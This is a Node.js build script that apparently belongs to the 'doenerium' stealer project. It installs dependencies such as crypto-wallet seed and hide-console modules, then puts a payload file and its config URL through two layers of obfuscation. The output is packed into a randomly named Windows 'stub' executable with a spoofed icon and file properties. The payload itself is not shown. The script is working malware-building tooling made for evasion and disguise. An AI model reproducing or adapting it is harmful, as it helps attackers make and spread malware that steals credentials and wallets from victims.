const jsconfuser = require('js-confuser');
const jsobf = require("javascript-obfuscator");
const fs = require("fs");
const child_process = require("child_process");
const os = require("os");
const https = require('https');
const exe = require('@angablue/exe');
const config = require("./config.js")()


async function install_node_gyp() {
    return new Promise(res => {
        res(child_process.execSync("npm install -g node-gyp"))
    })
}

let result = '';


var isModuleAvailableSync = function (moduleName) {
    var ret = false; // return value, boolean
    var dirSeparator = require("path").sep

    // scan each module.paths. If there exists
    // node_modules/moduleName then
    // return true. Otherwise return false.
    module.paths.forEach(function (nodeModulesPath) {
        if (fs.existsSync(nodeModulesPath + dirSeparator + moduleName) === true) {
            ret = true;
            return false; // break forEach
        }
    });

    return ret;
}

async function install_module(module_name) {
    return new Promise(res => {
        res(child_process.execSync(`npm install ${module_name}`))
    })
}

async function check_all_modules_installed() {
    return new Promise(async (res) => {
        [
            "@peculiar/webcrypto",
            "axios",
            "bitcoin-seed",
            "boukiapi",
            "buffer-replace",
            "form-data",
            "javascript-obfuscator",
            "js-confuser",
            "node-forge",
            "node-gyp",
            "node-hide-console-window",
            "node-powershell",
            "request",
            "seco-file",
            "sqlite3",
            "systeminformation",
            "zip-lib"
        ].forEach(async (moduleName) => {
            if (!isModuleAvailableSync(moduleName)) {
                console.log(`Installing "${moduleName}" as it is not installed`)
                await install_module(moduleName)
                console.log(`Installed "${moduleName}"`)
            }
        })

        res()
    })
}

async function fix_node_gyp(versions) {
    const appdata = process.env.LOCALAPPDATA;

    for (var version of versions) {
        for (var file of fs.readdirSync(`${appdata}\\node-gyp\\Cache\\${version}\\include\\node`)) {
            if (file.includes(".DELETE")) {
                console.log(`node-gyp-fix | Fixed ${file}`)
                fs.renameSync(`${appdata}\\node-gyp\\Cache\\${version}\\include\\node\\${file}`, `${appdata}\\node-gyp\\Cache\\${version}\\include\\node\\${file.split(".DELETE")[0]}`)
            }
        }
    }
}

async function rebuild() {
    return new Promise(res => {
        console.log("Rebuilding packages")
        res(child_process.execSync("npm rebuild"))
        console.log("Rebuilt packages")
    })
}

async function fix_dependencies() {

    return new Promise(async res => {
        const appdata = process.env.LOCALAPPDATA;

        if (!fs.readdirSync(appdata).includes("node-gyp")) {
            await install_node_gyp();
            await fix_dependencies();
        }

        const node_js_versions = fs.readdirSync(`${appdata}\\node-gyp\\Cache`);
        await fix_node_gyp(node_js_versions)
        res(await rebuild());
    })


}

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

async function obfuscate(input, output) {

    return new Promise(res => {
        const OBF_PAYLOAD_CONFIG = {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            shuffleStringArray: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }

        var data = jsobf.obfuscate(fs.readFileSync(input, "utf-8"), OBF_PAYLOAD_CONFIG).getObfuscatedCode();

        jsconfuser.obfuscate(data, {
            target: "node",
            renameVariables: false,
            controlFlowFlattening: 0,
            globalConcealing: false,
            stringCompression: 1,
            stringConcealing: 1,
            stringEncoding: 1,
            stringSplitting: 1,
            deadCode: 1,
            calculator: 1,
            compact: true,
            movedDeclarations: false,
            objectExtraction: false,
            stack: 1,
            duplicateLiteralsRemoval: 0,
            flatten: false,
            dispatcher: 0,
            opaquePredicates: 0,
            shuffle: { hash: 0, true: 0 },
        }).then(obfuscated => {
            let modules = `require("child_process");
                            require("crypto");
                            require("fs");
                            require("os");
                            require("path");
                            require("stream");
                            require("zip-lib");
                            require("boukiapi");
                            require("systeminformation");
                            require("sqlite3");
                            require("request");
                            require("node-hide-console-window");
                            require("form-data");
                            require("buffer-replace");
                            require("axios");
                            require("./config_obf.js");
                            `

            res(fs.writeFileSync(output, modules + obfuscated));


        })
    })
}

/**
 * Download a resource from `url` to `dest`.
 * @param {string} url - Valid URL to attempt download of resource
 * @param {string} dest - Valid path to save the file.
 * @returns {Promise<void>} - Returns asynchronously when successfully completed download
 */
function download(url, dest) {
    return new Promise((resolve, reject) => {
        // Check file does not exist yet before hitting network
        fs.access(dest, fs.constants.F_OK, async (err) => {

            if (err === null) {
                fs.unlinkSync(dest)
                resolve(await download(url, dest))
            }

            const request = https.get(url, response => {
                if (response.statusCode === 200) {

                    const file = fs.createWriteStream(dest, { flags: 'wx' });
                    file.on('finish', () => resolve());
                    file.on('error', async err => {
                        file.close();
                        if (err.code === 'EEXIST') {
                            fs.unlinkSync(dest)
                            resolve(await download(url, dest))
                        }
                        else { fs.unlink(dest, () => reject(err.message)) }; // Delete temp file
                    });
                    response.pipe(file);
                } else if (response.statusCode === 302 || response.statusCode === 301) {
                    //Recursively follow redirects, only a 200 will resolve.
                    download(response.headers.location, dest).then(() => resolve());
                } else {
                    reject(`Server responded with ${response.statusCode}: ${response.statusMessage}`);
                }
            });

            request.on('error', err => {
                reject(err.message);
            });
        });
    });
}
async function rebuild_node_gyp() {

}

function get_pkg_cache() {
    const pkg_cache_path = `${process.env.SystemDrive}\\Users\\${os.userInfo().username}\\.pkg-cache`;

    if (!fs.existsSync(pkg_cache_path)) {
        fs.mkdirSync(pkg_cache_path)
        fs.mkdirSync(`${pkg_cache_path}\\v3.4`)
    }

    return `${pkg_cache_path}\\v3.4`;
}

(async () => {


    console.log("Downloading Node.js pre-built binary")
    let start = Date.now()
    await download("https://github.com/vercel/pkg-fetch/releases/download/v3.5/node-v18.15.0-win-x64", `${get_pkg_cache()}\\built-v18.5.0-win-x64`)
    console.log(`Downloaded Node.js pre-built binary within ${(Date.now() - start) / 1000} seconds`);


    console.log("Checking if all modules are installed")
    await check_all_modules_installed();
    console.log("Checked if all modules are installed")

    console.log("Fixing dependencies")
    await fix_dependencies();
    console.log("Fixed dependencies")

    const index_file = "index.js";
    console.log(`Obfuscating source code`)
    start = Date.now()
    await obfuscate("doenerium.js", index_file);
    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: ${index_file}`);
    console.log(`Obfuscating config URL`)
    start = Date.now()
    await obfuscate("config.js", "config_obf.js");
    console.log(`Finished obfuscating source code within ${(Date.now() - start) / 1000} seconds: config_obf.js`);

    console.log(`Building stub...`)

    let randomid = makeid(8)
    start = Date.now()
    const build = await exe({
        entry: '.',
        out: `./doenerium_${randomid}.exe`,
        icon: config.icon,
        target: 'node18-win-x64',
        pkg: ['-C', 'GZip'],
        properties: config.properties
    })

    //child_process.execSync(`pkg . -C GZip -t node18 -o doenerium_${randomid}.exe`)
    fs.unlinkSync(index_file);
    fs.unlinkSync("config_obf.js");

    console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: doenerium_${randomid}.exe`)
    console.log(`You can now close this window.`)

    while (true) { }
})()
